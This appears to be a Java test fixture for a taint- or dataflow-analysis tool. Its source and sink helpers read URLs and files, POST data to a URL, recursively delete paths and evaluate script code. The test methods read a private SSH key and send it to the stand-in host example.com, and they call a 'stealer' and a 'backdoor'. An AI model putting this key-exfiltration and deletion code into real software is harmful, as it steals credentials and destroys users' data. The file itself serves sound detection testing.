package test_classes;

import test_classes.TestEval;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import javax.script.*;


@SuppressWarnings("javadoc")
public class TestSummary {
	private String fieldSource = null;
	private String fieldHop = null;
	private String fieldSink = null;
	
	public void updateHop() {
		this.fieldHop = this.fieldSource;
	}
	
	public void updateSink() {
		this.fieldSink = this.fieldHop;
	}
	
    public String newUrlReadSource(String urlStr) throws Exception {
    	URL url = new URL(urlStr);
        URLConnection connection = url.openConnection();
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        StringBuilder response = new StringBuilder();
        String decodedString;
        while ((decodedString = in.readLine()) != null) {
            response.append(decodedString);
        }
        in.close();
        return response.toString();
    }
    
    public String newFileReadSource(String pathStr) throws Exception {
    	return new String(Files.readAllBytes(Paths.get(pathStr)));    	
    }
    
    public void newUrlWriteSink(String content, String urlStr) throws Exception {
        URL url = new URL(urlStr);
        URLConnection connection = url.openConnection();
        connection.setDoOutput(true);

        OutputStreamWriter out = new OutputStreamWriter(connection.getOutputStream());
        out.write("content=" + content);
        out.close();
    }
    
    public void newFileWriteSink(String content, String pathStr) throws Exception {
    	PrintWriter out = new PrintWriter(pathStr);
    	out.println(content);
    }
    
    public void newFileRemoveSink(String pathStr) throws Exception {
    	Files.walk(Paths.get(pathStr)).map(Path::toFile).sorted((o1, o2) -> -o1.compareTo(o2)).forEach(File::delete);    	
    }

    public void newEvalSink(String code) throws Exception {
        final ScriptEngineManager manager = new ScriptEngineManager();
        final ScriptEngine engine = manager.getEngineByName("nashorn");
        engine.eval(code);
    }

    public void interMethodLeak() throws Exception {
    	// leak through new source and sink
    	String content = newFileReadSource("/home/maloss/.ssh/id_rsa");
    	newUrlWriteSink(content, "http://www.example.com");
    }
    
    public void fieldLeak() throws Exception {
    	// leak through fields
    	this.fieldSource = newFileReadSource("/home/maloss/.ssh/id_rsa");
    	updateHop();
    	updateSink();
    	newUrlWriteSink(this.fieldSink, "http://www.example.com");
    }
    
    public void interClassLeak() throws Exception {
    	// leak by across multiple classes
    	TestEval.runStealer("/home/maloss/.ssh/id_rsa", "http://www.example.com");
    	TestEval.runBackdoor("http://www.example.com");
    }
}
